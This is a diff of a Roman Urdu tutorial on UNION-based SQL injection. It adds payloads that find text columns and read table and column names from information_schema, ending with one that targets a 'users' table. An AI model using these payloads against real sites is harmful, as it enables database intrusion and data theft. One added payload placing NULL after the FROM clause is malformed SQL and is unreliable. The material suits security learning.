@@ -32,10 +32,34 @@ Agar ` ' UNION SELECT NULL,NULL-- ` aany pr website py yeh display hoo jaye or b
 
 ### Checking which column contain text data
 
-` ' UNION SELECT "abc",NULL,NULL-- `
+` ' UNION SELECT 'abc',NULL,NULL-- `
 
-` ' UNION SELECT NULL,"abc",NULL-- `
+` ' UNION SELECT NULL,'abc',NULL-- `
 
-` ' UNION SELECT NULL,NULL,"abc"-- `
+` ' UNION SELECT NULL,NULL,'abc'-- `
 
 Jab yeh pata chal jaye ky website main kitny columns hain too iusky baad ka step yeh check krna hota hai ky kis column main text data jaa rha hai isky liye yeh oper wali sub combinations try ki ati hain jis combination pr error na aye yani iusky andar text data jaa rha hai or iusi column sy hum data retrive krty hain.
+
+---
+
+### Checking Table Name
+
+` ' UNION SELECT NULL,table_name FROM information_schema.tables--`
+
+Table or column name ka pata hona bht zyada zaroori hai isky baghair data retrive nhi hoo skta. Database main aik jagah hoti hai jisko information schema kehty hain wahan database ky tables or columns ki information hoti hai, isi jagah sy hum yeh information nikalty hain. Oper di gyi command sy yeh pata chalta hai ky table name kya hai lekin iss sy pehly yeh pata hona zaroori hai jy kitny columns hai oper di gyi command 2 columns ky hissab sy hai agar 3 columns hon too phir yeh command hogi
+
+` ' UNION SELECT NULL,NULL,table_name FROM information_schema.tables--`
+
+Aik or baat yeh ky agar yeh command work na kare too phir column no change kiya jaa skta hai jaisy
+
+` ' UNION SELECT NULL,table_name FROM information_schema.tables,NULL--`
+
+---
+
+### Checking Columns Name
+
+` ' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--
+
+Yeh command table name find krny ky baad daali jati hai iss command sy column name ka pata chalta hai.
+
+---
